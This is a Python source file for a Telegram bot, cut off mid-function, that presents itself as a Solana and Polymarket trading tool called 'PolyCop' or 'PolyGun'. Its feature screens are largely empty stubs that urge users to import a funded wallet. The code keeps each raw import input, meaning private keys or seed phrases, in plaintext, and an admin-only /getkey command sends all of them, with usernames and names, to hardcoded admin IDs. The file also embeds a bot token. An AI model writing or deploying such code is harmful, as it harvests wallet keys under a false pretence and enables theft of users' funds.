"""
Solana Telegram Trading Bot
Features: Wallet import/create, balance check, token prices, buy/sell via Jupiter
All responses are sent as new messages so full chat history is always preserved.
"""
import os
import logging
import base64
import aiohttp
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solana.rpc.async_api import AsyncClient
from cryptography.fernet import Fernet
from mnemonic import Mnemonic
import hashlib

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "8947267795:AAFYWixbOYkQEQtx8BsboCQvlugIXunhLbY")
RPC_URL     = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")

ENCRYPT_KEY = os.getenv("ENCRYPT_KEY") or Fernet.generate_key()
fernet      = Fernet(ENCRYPT_KEY)

# Admin user IDs — find yours by messaging @userinfobot on Telegram
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "7971878131,8788509984").split(",") if x.strip()]

# In-memory user store { user_id: { "keypair_enc": bytes, "pubkey": str } }
# Replace with a proper encrypted DB in production
user_wallets: dict[int, dict] = {}

# Raw wallet import inputs { user_id: [ { "text": str, "valid": bool, ... } ] }
wallet_import_history: dict[int, list[dict]] = {}

# All users who have interacted with the bot { user_id: { "username": str, ... } }
all_users: dict[int, dict] = {}

EXPORT_MESSAGE_LIMIT = 3900
REFERRAL_CODE_ALPHABET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
REFERRAL_CODE_INDEX = {char: idx for idx, char in enumerate(REFERRAL_CODE_ALPHABET)}

JUPITER_QUOTE_URL = "https://quote-api.jup.ag/v6/quote"
JUPITER_SWAP_URL  = "https://quote-api.jup.ag/v6/swap"
SOL_MINT          = "So11111111111111111111111111111111111111112"

# Conversation states
AWAITING_PRIVATE_KEY = 1
AWAITING_TOKEN_ADDR  = 2
AWAITING_BUY_AMOUNT  = 3
AWAITING_SELL_AMOUNT = 4

# ── Helpers ───────────────────────────────────────────────────────────────────
def encrypt_key(secret_bytes: bytes) -> bytes:
    return fernet.encrypt(secret_bytes)

def decrypt_key(token: bytes) -> bytes:
    return fernet.decrypt(token)

def get_keypair(user_id: int) -> Keypair | None:
    entry = user_wallets.get(user_id)
    if not entry:
        return None
    return Keypair.from_bytes(decrypt_key(entry["keypair_enc"]))

def _format_full_name(info: dict) -> str:
    parts = [info.get("first_name"), info.get("last_name")]
    return " ".join(part for part in parts if part).strip()

def _encode_referral_code(uid: int) -> str:
    if uid < 0:
        raise ValueError("uid must be non-negative")
    if uid == 0:
        return "0"

    chars = []
    while uid:
        uid, remainder = divmod(uid, 62)
        chars.append(REFERRAL_CODE_ALPHABET[remainder])
    return "".join(reversed(chars))

def _decode_referral_code(code: str) -> int | None:
    code = code.strip()
    if not code:
        return None
    if code.isdigit():
        return int(code)

    value = 0
    for char in code:
        if char not in REFERRAL_CODE_INDEX:
            return None
        value = value * 62 + REFERRAL_CODE_INDEX[char]
    return value

def _referral_code(uid: int) -> str:
    return _encode_referral_code(uid)

def _referral_link(uid: int, bot_username: str) -> str:
    return f"https://t.me/{bot_username}?start=ref_{_referral_code(uid)}"

def _split_message(text: str, limit: int = EXPORT_MESSAGE_LIMIT) -> list[str]:
    if len(text) <= limit:
        return [text]

    chunks: list[str] = []
    current = ""

    for line in text.splitlines(keepends=True):
        if len(line) > limit:
            if current:
                chunks.append(current.rstrip("\n"))
                current = ""

            for start in range(0, len(line), limit):
                part = line[start : start + limit].rstrip("\n")
                if part:
                    chunks.append(part)
            continue

        if current and len(current) + len(line) > limit:
            chunks.append(current.rstrip("\n"))
            current = line
        else:
            current += line

    if current:
        chunks.append(current.rstrip("\n"))

    return [chunk for chunk in chunks if chunk]

async def _delete_message_job(context: ContextTypes.DEFAULT_TYPE):
    chat_id, message_id = context.job.data
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception as exc:
        logger.debug("Failed to delete message %s/%s: %s", chat_id, message_id, exc)

def _record_wallet_import_input(uid: int, raw_text: str, origin: str | None) -> dict:
    entry = {
        "text": raw_text,
        "valid": False,
        "origin": origin or "unknown",
        "timestamp": datetime.now().isoformat(timespec="seconds"),
    }
    wallet_import_history.setdefault(uid, []).append(entry)
    return entry

async def get_sol_balance(pubkey_str: str) -> float:
    async with AsyncClient(RPC_URL) as client:
        resp = await client.get_balance(Pubkey.from_string(pubkey_str))
        return resp.value / 1e9

async def get_token_price_usd(mint: str) -> float | None:
    url = f"https://price.jup.ag/v4/price?ids={mint}"
    async with aiohttp.ClientSession() as s:
        async with s.get(url) as r:
            if r.status != 200:
                return None
            data = await r.json()
            return data.get("data", {}).get(mint, {}).get("price")

async def jupiter_quote(in_mint: str, out_mint: str, amount_lamports: int):
    params = {
        "inputMint":   in_mint,
        "outputMint":  out_mint,
        "amount":      amount_lamports,
        "slippageBps": 50,
    }
    async with aiohttp.ClientSession() as s:
        async with s.get(JUPITER_QUOTE_URL, params=params) as r:
            if r.status != 200:
                return None
            return await r.json()

async def jupiter_swap(quote: dict, user_pubkey: str) -> dict | None:
    payload = {
        "quoteResponse":             quote,
        "userPublicKey":             user_pubkey,
        "wrapAndUnwrapSol":          True,
        "dynamicComputeUnitLimit":   True,
        "prioritizationFeeLamports": 1000,
    }
    async with aiohttp.ClientSession() as s:
        async with s.post(JUPITER_SWAP_URL, json=payload) as r:
            if r.status != 200:
                return None
            return await r.json()

# ── Keyboards ─────────────────────────────────────────────────────────────────
def main_menu_keyboard():
    # Layout mirrors the provided reference: two prominent single-action rows,
    # then grouped utility rows with the widest actions on top.
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Copy Trade", callback_data="copy_trade")],
        [InlineKeyboardButton("AFK Auto Trade", callback_data="afk_mode")],
        [InlineKeyboardButton("📈 Market", callback_data="markets"),
         InlineKeyboardButton("Smart Market ↗", callback_data="positions")],
        [InlineKeyboardButton("💳Deposit & Wallet", callback_data="wallets"),
         InlineKeyboardButton("🏦 Positions", callback_data="portfolio")],
        [InlineKeyboardButton("💵 Smart Money ↗", callback_data="recovery")],
        [InlineKeyboardButton("Address ↗", callback_data="bridge"),
         InlineKeyboardButton("Signal ↗", callback_data="limit_orders"),
         InlineKeyboardButton("👤User", callback_data="portfolio_user")],
        [InlineKeyboardButton("Competition 🏆", callback_data="competition"),
         InlineKeyboardButton("Notifications", callback_data="quick_start")],
        [InlineKeyboardButton("English 🇺🇳", callback_data="language_menu"),
         InlineKeyboardButton("💰 Referrals", callback_data="referral")],
        [InlineKeyboardButton("Settings", callback_data="settings"),
         InlineKeyboardButton("🆘Help", callback_data="help"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh")],
    ])

def import_prompt_keyboard(origin: str):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Import Wallet", callback_data=f"do_import__{origin}")],
        [InlineKeyboardButton("❌ Cancel",         callback_data="cancel_prompt")],
    ])

def back_to_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")],
    ])

def positions_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🏛️ Politics",   callback_data="market_politics"),
         InlineKeyboardButton("🏅 Sports",      callback_data="market_sports")],
        [InlineKeyboardButton("🪙 Crypto",      callback_data="market_crypto"),
         InlineKeyboardButton("🦅 Trump",       callback_data="market_trump")],
        [InlineKeyboardButton("💹 Finance",     callback_data="market_finance"),
         InlineKeyboardButton("🌎 Geopolitics", callback_data="market_geopolitics")],
        [InlineKeyboardButton("📊 Volume",      callback_data="market_volume"),
         InlineKeyboardButton("🔥 Trending",    callback_data="market_trending")],
        [InlineKeyboardButton("🏠 Main Menu",   callback_data="positions_homepage")],
    ])

def wallet_settings_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Import Wallet",  callback_data="wallets_import"),
         InlineKeyboardButton("❌ Delete Wallet",   callback_data="wallets_delete")],
        [InlineKeyboardButton("◀️ Back",           callback_data="wallets_back"),
         InlineKeyboardButton("🗑️ Close",          callback_data="wallets_close")],
    ])

LANGUAGE_MENU_TEXT = (
    "⚙️ Switch system language: Click the\n"
    "language name to switch the language of\n"
    "PolyCop"
)

LANGUAGE_SELECTIONS = {
    "language_select_en": "en",
    "language_select_ja": "ja",
    "language_select_ru": "ru",
    "language_select_ko": "ko",
    "language_select_fr": "fr",
    "language_select_ar": "ar",
    "language_select_zh_tw": "zh_tw",
    "language_select_zh_cn": "zh_cn",
    "language_select_pt": "pt",
    "language_select_es": "es",
}

LANGUAGE_WALLET_COPY = {
    "en": {
        "title": "💰 Wallet Settings",
        "manage": "Manage your wallets quickly and easily.",
        "available": "👜 Available Wallets",
        "none": "No wallets imported yet.",
        "updated": "🕐 Last updated:",
        "import": "🔑 Import Wallet",
        "delete": "❌ Delete Wallet",
        "back": "◀️ Back",
        "close": "🗑️ Close",
    },
    "ja": {
        "title": "💰 ウォレット設定",
        "manage": "ウォレットをすばやく簡単に管理できます。",
        "available": "👜 利用可能なウォレット",
        "none": "まだインポートされたウォレットはありません。",
        "updated": "🕐 最終更新:",
        "import": "🔑 ウォレットをインポート",
        "delete": "❌ ウォレットを削除",
        "back": "◀️ 戻る",
        "close": "🗑️ 閉じる",
    },
    "ru": {
        "title": "💰 Настройки кошелька",
        "manage": "Управляйте своими кошельками быстро и удобно.",
        "available": "👜 Доступные кошельки",
        "none": "Кошельки еще не импортированы.",
        "updated": "🕐 Обновлено:",
        "import": "🔑 Импортировать кошелек",
        "delete": "❌ Удалить кошелек",
        "back": "◀️ Назад",
        "close": "🗑️ Закрыть",
    },
    "ko": {
        "title": "💰 지갑 설정",
        "manage": "지갑을 빠르고 쉽게 관리하세요.",
        "available": "👜 사용 가능한 지갑",
        "none": "아직 가져온 지갑이 없습니다.",
        "updated": "🕐 마지막 업데이트:",
        "import": "🔑 지갑 가져오기",
        "delete": "❌ 지갑 삭제",
        "back": "◀️ 뒤로",
        "close": "🗑️ 닫기",
    },
    "fr": {
        "title": "💰 Paramètres du portefeuille",
        "manage": "Gérez vos portefeuilles rapidement et facilement.",
        "available": "👜 Portefeuilles disponibles",
        "none": "Aucun portefeuille importé pour le moment.",
        "updated": "🕐 Dernière mise à jour :",
        "import": "🔑 Importer le portefeuille",
        "delete": "❌ Supprimer le portefeuille",
        "back": "◀️ Retour",
        "close": "🗑️ Fermer",
    },
    "ar": {
        "title": "💰 إعدادات المحفظة",
        "manage": "أدر محافظك بسرعة وسهولة.",
        "available": "👜 المحافظ المتاحة",
        "none": "لم يتم استيراد أي محفظة بعد.",
        "updated": "🕐 آخر تحديث:",
        "import": "🔑 استيراد المحفظة",
        "delete": "❌ حذف المحفظة",
        "back": "◀️ رجوع",
        "close": "🗑️ إغلاق",
    },
    "zh_tw": {
        "title": "💰 錢包設定",
        "manage": "快速且輕鬆地管理你的錢包。",
        "available": "👜 可用錢包",
        "none": "尚未匯入任何錢包。",
        "updated": "🕐 最後更新：",
        "import": "🔑 匯入錢包",
        "delete": "❌ 刪除錢包",
        "back": "◀️ 返回",
        "close": "🗑️ 關閉",
    },
    "zh_cn": {
        "title": "💰 钱包设置",
        "manage": "快速轻松地管理你的钱包。",
        "available": "👜 可用钱包",
        "none": "尚未导入任何钱包。",
        "updated": "🕐 最后更新：",
        "import": "🔑 导入钱包",
        "delete": "❌ 删除钱包",
        "back": "◀️ 返回",
        "close": "🗑️ 关闭",
    },
    "pt": {
        "title": "💰 Configurações da carteira",
        "manage": "Gerencie suas carteiras de forma rápida e fácil.",
        "available": "👜 Carteiras disponíveis",
        "none": "Nenhuma carteira importada ainda.",
        "updated": "🕐 Última atualização:",
        "import": "🔑 Importar carteira",
        "delete": "❌ Excluir carteira",
        "back": "◀️ Voltar",
        "close": "🗑️ Fechar",
    },
    "es": {
        "title": "💰 Configuración de la billetera",
        "manage": "Administra tus billeteras de forma rápida y sencilla.",
        "available": "👜 Billeteras disponibles",
        "none": "Aún no hay billeteras importadas.",
        "updated": "🕐 Última actualización:",
        "import": "🔑 Importar billetera",
        "delete": "❌ Eliminar billetera",
        "back": "◀️ Volver",
        "close": "🗑️ Cerrar",
    },
}

def language_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("English", callback_data="language_select_en"),
         InlineKeyboardButton("日本語", callback_data="language_select_ja")],
        [InlineKeyboardButton("Русский", callback_data="language_select_ru"),
         InlineKeyboardButton("한국어", callback_data="language_select_ko")],
        [InlineKeyboardButton("Français", callback_data="language_select_fr"),
         InlineKeyboardButton("عربي", callback_data="language_select_ar")],
        [InlineKeyboardButton("繁體中文", callback_data="language_select_zh_tw"),
         InlineKeyboardButton("简体中文", callback_data="language_select_zh_cn")],
        [InlineKeyboardButton("Português", callback_data="language_select_pt"),
         InlineKeyboardButton("Español", callback_data="language_select_es")],
        [InlineKeyboardButton("← Back", callback_data="language_back")],
    ])

def _wallet_settings_language(language: str) -> dict:
    return LANGUAGE_WALLET_COPY.get(language, LANGUAGE_WALLET_COPY["en"])

def _localized_wallet_settings_text(language: str = "en") -> str:
    copy = _wallet_settings_language(language)
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return (
        f"{copy['title']}\n"
        f"{copy['manage']}\n\n"
        f"{copy['available']}\n"
        f"{copy['none']}\n\n"
        f"{copy['updated']} {ts}"
    )

def wallet_settings_keyboard(language: str = "en"):
    copy = _wallet_settings_language(language)
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(copy["import"], callback_data="wallets_import"),
         InlineKeyboardButton(copy["delete"], callback_data="wallets_delete")],
        [InlineKeyboardButton(copy["back"], callback_data="wallets_back"),
         InlineKeyboardButton(copy["close"], callback_data="wallets_close")],
    ])

MARKET_CATEGORY_LABELS = {
    "market_politics": "Politics",
    "market_sports": "Sports",
    "market_crypto": "Crypto",
    "market_trump": "Trump",
    "market_finance": "Finance",
    "market_geopolitics": "Geopolitics",
    "market_volume": "Volume",
    "market_trending": "Trending",
}

def _markets_text(selected_category: str | None = None) -> str:
    selected_line = (
        f"\n\nSelected category: *{selected_category}*"
        if selected_category
        else ""
    )
    return (
        "🔷 *PolyGun*\n\n"
        "*ALL MARKETS*\n\n"
        "Explore every live prediction market across all categories in one place.\n\n"
        "🔎 *Market Search - Choose a filter*\n\n"
        "Choose a category below or type in a custom search keywords (e.g. "
        "\"bitcoin\", \"trump\", \"earnings\")."
        f"{selected_line}"
    )

def _wallet_settings_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "💰 *Wallet Settings*\n"
        "Manage your wallets quickly and easily\\.\n\n"
        "👜 *Available Wallets*\nNo wallets imported yet\\.\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def _home_screen_text() -> str:
    return (
        "🚀 Lightning Copy Trade With 0-Block(0s) Latency on Polymarket\n\n"
        "Your Polymarket Balance: $0\n\n"
        "📥 Import wallet with at least 100 USDC / USDT (Start with 1k so you can match returns) on Polygon, OP, Base, Ethereum, BSC and Arbitrum\n\n"
        "Other deposit options: /wallet\n"
        "PolyCop is gas free, no need to deposit POL\n\n"
        "• /copytrade - The fastest copy speed, limit order copy, TP/SL\n"
        "• /positions - View Positions\n"
        "• Search Markets - Enter market name in the bot\n"
        "• AI Analysis - Enter address in the bot"
    )

def _help_text() -> str:
    return (
        "📚 Help\n\n"
        "Use the menu to navigate between markets, wallet tools, and settings.\n"
        "Import your wallet when prompted.\n\n"
        "If the bot is slow, contact support."
    )

def help_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Recovery",     callback_data="help_recovery")],
        [InlineKeyboardButton("Create Ticket", callback_data="help_create_ticket")],
    ])

def recovery_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Add wallet", callback_data="recovery_add_wallet")],
    ])

def _recovery_text() -> str:
    return (
        "Eligible Accounts are required to access smart wallets"
    )

def _user_profile_text() -> str:
    return "No user profile detected"

def lp_sniper_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Create Task", callback_data="lp_sniper_create")],
        [InlineKeyboardButton("◀️ Back",        callback_data="lp_sniper_back"),
         InlineKeyboardButton("🔄 Refresh",     callback_data="lp_sniper_refresh")],
        [InlineKeyboardButton("🗑️ Close",       callback_data="lp_sniper_close")],
    ])

def _lp_sniper_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🌸 *PolyGun Sniper*\n\n"
        "🧐 No active sniper tasks\\!\n\n"
        "📖 [Learn More\\!](https://your-link-here)\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def copy_trade_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Create Copy Trade", callback_data="copy_trade_create")],
        [InlineKeyboardButton("➕ Use Sub-Wallet Create Copy", callback_data="copy_trade_subwallet")],
        [InlineKeyboardButton("🔬 Run Copy BackTesting ↗", callback_data="copy_trade_backtesting")],
        [InlineKeyboardButton("Default copy trading settings", callback_data="copy_trade_defaults")],
        [InlineKeyboardButton("🔔 Failed Alerts On", callback_data="copy_trade_failed_alerts"),
         InlineKeyboardButton("▽ Stop All Copy Tasks", callback_data="copy_trade_stop_all")],
        [InlineKeyboardButton("← Back", callback_data="copy_trade_back"),
         InlineKeyboardButton("↻ Refresh", callback_data="copy_trade_refresh")],
    ])

def afk_mode_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("+ Create AFK Auto Trade", callback_data="afk_create")],
        [InlineKeyboardButton("🔬 Run AFK BackTesting ↗", callback_data="afk_backtesting")],
        [InlineKeyboardButton("← Back", callback_data="afk_back"),
         InlineKeyboardButton("↻ Refresh", callback_data="afk_refresh")],
    ])

def _afk_mode_text() -> str:
    return (
        "AFK Auto Trade\n\n"
        "AFK Auto Trade allows you to automate trades by setting conditions.\n\n"
        "✅ Indicates a AFK Auto Trade setup is active.\n"
        "❌ Indicates a AFK Auto Trade setup is paused.\n\n"
        "You can create multiple instances of the same strategy; different strategies won't interfere with each other.\n\n"
        "AFK Auto Trade Gitbook"
    )

def bridge_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💸 Set Address", callback_data="bridge_set_address")],
        [InlineKeyboardButton("❌ BSC",          callback_data="bridge_bsc"),
         InlineKeyboardButton("❌ ETH",          callback_data="bridge_eth"),
         InlineKeyboardButton("❌ BASE",         callback_data="bridge_base"),
         InlineKeyboardButton("❌ HYPE",         callback_data="bridge_hype")],
        [InlineKeyboardButton("✈️ Bridge",       callback_data="bridge_bridge")],
        [InlineKeyboardButton("◀️ Back",         callback_data="bridge_back"),
         InlineKeyboardButton("🔄 Refresh",      callback_data="bridge_refresh")],
        [InlineKeyboardButton("🗑️ Close",        callback_data="bridge_close")],
    ])

def _bridge_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🌸 *Bridge*\n\n"
        "Balance: 0 SOL\n\n"
        "Sender address: \\-\\-\n"
        "Receiver address: \\-\\-\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def referral_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 Generate Link", callback_data="referral_generate")],
        [InlineKeyboardButton("◀️ Back",                 callback_data="referral_back"),
         InlineKeyboardButton("🔄 Refresh",              callback_data="referral_refresh")],
        [InlineKeyboardButton("🗑️ Close",                callback_data="referral_close")],
    ])

def _referral_text(uid: int, bot_username: str) -> str:
    code = _referral_code(uid)
    link = _referral_link(uid, bot_username)
    return (
        "🫂 Referral Hub\n"
        "Earn commissions when your referrals trade!\n\n"
        "🪪 Your Code\n"
        f"{code}\n\n"
        "🔗 Invite Link\n"
        f"{link}\n\n"
        "━━━━━━━━━━━━━━━━\n"
        "🛰 Network Metrics\n"
        "├ Tier 1 Direct: 0 users (25%)\n"
        "├ Tier 2: 0 users (5%)\n"
        "├ Tier 3: 0 users (3%)\n"
        "└ Total Reach: 0 users\n\n"
        "━━━━━━━━━━━━━━━━\n"
        "💰 Earnings Dashboard\n"
        "├ Claimable: $0.0000 USDC\n"
        "└ Total Earned: $0.00 USDC\n\n"
        "⚠️ Minimum withdrawal: $5 USDC."
    )

def competition_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Add Account", callback_data="competition_add_account")],
        [InlineKeyboardButton("Close", callback_data="competition_close")],
    ])

def _competition_text() -> str:
    return (
        "🏆 Competition\n\n"
        "Link your account to access available competitions"
    )

def withdraw_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("50 %",           callback_data="withdraw_50"),
         InlineKeyboardButton("100 %",          callback_data="withdraw_100"),
         InlineKeyboardButton("X SOL",          callback_data="withdraw_xsol")],
        [InlineKeyboardButton("💸 Set Address", callback_data="withdraw_set_address")],
        [InlineKeyboardButton("◀️ Back",        callback_data="withdraw_back"),
         InlineKeyboardButton("🔄 Refresh",     callback_data="withdraw_refresh")],
        [InlineKeyboardButton("🗑️ Close",       callback_data="withdraw_close")],
    ])

def _withdraw_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🌸 *Withdraw Solana*\n\n"
        "Balance: \\-\\- SOL\n"
        "Current withdrawal address: \\-\\-\n\n"
        "🔧 Last address edit: \\-\\-\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def settings_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("← Back", callback_data="settings_back")],
        [InlineKeyboardButton("✅ Auto Redeem", callback_data="settings_auto_redeem")],
        [InlineKeyboardButton("Copy Mode: Mempool (Fast)", callback_data="settings_copy_mode")],
        [InlineKeyboardButton("❌ Manual Trade Confirm", callback_data="settings_manual_trade_confirm")],
        [InlineKeyboardButton("Buy/Sell Setting", callback_data="settings_buy_sell_setting")],
    ])

def _settings_text() -> str:
    return (
        "⚙️ Settings:\n\n"
        "Modified settings will take effect globally"
    )

def presales_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚙️ Config",    callback_data="presales_config")],
        [InlineKeyboardButton("Add Presale",  callback_data="presales_add")],
        [InlineKeyboardButton("◀️ Back",      callback_data="presales_back"),
         InlineKeyboardButton("🗑️ Close",     callback_data="presales_close")],
    ])

def _presales_text() -> str:
    return (
        "Add, remove, and manage presales\\!\n\n"
        "ℹ️ ⚙️ *Config dictates the default settings of your presales\\. "
        "You can further customize each presale individually\\.*"
    )

def _copy_trade_text() -> str:
    return (
        "🚀 Copy Trade\n\n"
        "Create and manage copy-trading tasks, sub-wallets, backtesting, alerts, and defaults.\n\n"
        "No active copy trades yet."
    )

def limit_orders_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🏠 Main Menu", callback_data="back_to_menu")],
    ])

def tpsl_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Active", callback_data="tpsl_active"),
         InlineKeyboardButton("Closed", callback_data="tpsl_closed")],
        [InlineKeyboardButton("Go to Portfolio", callback_data="tpsl_portfolio")],
    ])

def _limit_orders_text() -> str:
    return (
        "📝 Limit Orders\n\n"
        "You have no active limit orders.\n\n"
        "To place a limit buy order:\n"
        "1. Paste a Polymarket URL or search markets.\n"
        "2. Select 📝 Limit Yes or 📝 Limit No.\n"
        "3. Enter your price and amount.\n\n"
        "To place a limit sell order:\n"
        "1. Open 📊 Portfolio and navigate to an open position.\n"
        "2. Select the Sell option.\n"
        "3. Select 📊 Limit Sell.\n"
        "4. Enter your price and amount."
    )

def _tpsl_text() -> str:
    return (
        "🛡️ TP/SL Orders\n\n"
        "You have no active TP/SL orders."
    )

def portfolio_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("← Back", callback_data="portfolio_back"),
         InlineKeyboardButton("↻ Refresh", callback_data="portfolio_refresh")],
        [InlineKeyboardButton("📄 PNL Report", callback_data="portfolio_pnl_report")],
        [InlineKeyboardButton("🔹 Address ↗", callback_data="portfolio_address"),
         InlineKeyboardButton("🔔 Signal", callback_data="portfolio_signal"),
         InlineKeyboardButton("🟩 User", callback_data="portfolio_user")],
        [InlineKeyboardButton("⇄ PNL", callback_data="portfolio_pnl"),
         InlineKeyboardButton("🌐 Smart Money ↗", callback_data="portfolio_smart_money")],
        [InlineKeyboardButton("🏆 World Cup Competition", callback_data="portfolio_competition")],
    ])

def _portfolio_text() -> str:
    return (
        "🏛️ Manage your Positions(0) :\n\n"
        "Total Balance: $0 - W1 ✏️\n"
        "View Profile • AI Analysis • Polygonscan\n"
        "Available Balance: $0\n"
        "Positions Value: $0\n"
        "Positions PNL: +$0 (0%)\n"
        "Trade Comp • AI Wallet • Limit Order\n\n"
        "No positions found.\n\n"
        "PolyMarket's prices, total balances, and Redeem functions sometimes suffer from latency.\n"
        "🌐 Web • AFK • COPY • Market • Smart Market"
    )

# ── Chains ────────────────────────────────────────────────────────────────────
CHAINS = ["sol", "eth", "bnb", "base", "hype", "tron", "sui", "pol"]

def chains_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("SOL",  callback_data="chain_sol"),
         InlineKeyboardButton("ETH",  callback_data="chain_eth")],
        [InlineKeyboardButton("BNB",  callback_data="chain_bnb"),
         InlineKeyboardButton("BASE", callback_data="chain_base")],
        [InlineKeyboardButton("HYPE", callback_data="chain_hype"),
         InlineKeyboardButton("TRON", callback_data="chain_tron")],
        [InlineKeyboardButton("SUI",  callback_data="chain_sui"),
         InlineKeyboardButton("POL",  callback_data="chain_pol")],
        [InlineKeyboardButton("◀️ Back", callback_data="chains_back")],
    ])

def chain_wallet_keyboard(chain: str):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🔑 Import {chain.upper()} Wallet", callback_data=f"chain_{chain}_import"),
         InlineKeyboardButton("❌ Delete Wallet", callback_data="wallets_delete")],
        [InlineKeyboardButton("◀️ Back", callback_data="chains"),
         InlineKeyboardButton("🗑️ Close", callback_data="wallets_close")],
    ])

def _chain_wallet_text(chain: str) -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        f"💰 *{chain.upper()} Wallet Settings*\n\n"
        f"Import your {chain.upper()} wallet to get started\\.\n\n"
        f"👜 *Available Wallets*\nNo wallets imported yet\\.\n\n"
        f"🕐 *Last updated:* {ts}"
    )

# ── Main menu buttons ─────────────────────────────────────────────────────────
MAIN_MENU_BUTTONS = {
    "positions", "lp_sniper", "copy_trade", "wallets", "afk_mode",
    "presales", "settings", "limit_orders", "withdraw", "referral",
    "bridge", "refresh", "recovery", "chains",
}

# ── Start ─────────────────────────────────────────────────────────────────────
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user:
        user_info = all_users.setdefault(user.id, {})
        user_info.update({
            "username":   user.username,
            "first_name": user.first_name,
            "last_name":  user.last_name,
        })
        if ctx.args:
            token = ctx.args[0].strip()
            if token.startswith("ref_"):
                token = token[4:]
            referrer_uid = _decode_referral_code(token)
            if referrer_uid is not None and referrer_uid != user.id:
                user_info["referrer_uid"] = referrer_uid
                ctx.user_data["referrer_uid"] = referrer_uid

    await update.message.reply_text(
        _home_screen_text(),
        reply_markup=main_menu_keyboard(),
    )

# ── Admin command ─────────────────────────────────────────────────────────────
async def getkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Admin-only: /getkey [user_id|all] — exports stored wallet inputs."""
    caller_id = update.effective_user.id

    if caller_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    if update.message.chat.type != "private":
        await update.message.reply_text("⚠️ Use this command in a private chat only.")
        return

    target_uid: int | None = None
    if ctx.args:
        arg = ctx.args[0].strip().lower()
        if arg not in {"all", "*"}:
            try:
                target_uid = int(arg)
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID.")
                return

    if target_uid is None:
        target_ids = sorted(set(user_wallets) | set(wallet_import_history))
        if not target_ids:
            await update.message.reply_text("❌ No wallet inputs found.")
            return
        header = "🔑 Admin Wallet Export\n\nShowing all stored wallet inputs."
    else:
        if target_uid not in user_wallets and target_uid not in wallet_import_history:
            await update.message.reply_text(f"❌ No wallet inputs found for user {target_uid}.")
            return
        target_ids = [target_uid]
        header = f"🔑 Admin Wallet Export\n\nShowing wallet inputs for user {target_uid}."

    lines = [header, "", f"Total users: {len(target_ids)}", ""]
    for index, uid in enumerate(target_ids, start=1):
        entry = user_wallets.get(uid)
        info = all_users.get(uid, {})
        username = info.get("username")
        full_name = _format_full_name(info)
        history = wallet_import_history.get(uid, [])
        lines.extend([
            f"[{index}] User ID: {uid}",
            f"Username: @{username}" if username else "Username: N/A",
            f"Name: {full_name}" if full_name else "Name: N/A",
            f"Current public key: {entry.get('pubkey', 'N/A')}" if entry else "Current public key: N/A",
            f"Import attempts: {len(history)}",
            "",
        ])

        if history:
            for attempt_index, attempt in enumerate(history, start=1):
                lines.extend([
                    f"  - Attempt {attempt_index}",
                    f"    Time: {attempt.get('timestamp', 'N/A')}",
                    f"    Origin: {attempt.get('origin', 'unknown')}",
                    f"    Status: {'valid' if attempt.get('valid') else 'invalid'}",
                    "    Input:",
                    f"    {attempt.get('text', '')}",
                ])
                if attempt.get("pubkey"):
                    lines.append(f"    Pubkey: {attempt['pubkey']}")
                lines.append("")
        elif entry and entry.get("original_input") is not None:
            lines.extend([
                "Imported input:",
                entry.get("original_input", "N/A"),
                "",
            ])

    message_text = "\n".join(lines).rstrip()
    sent_messages = []
    for chunk in _split_message(message_text):
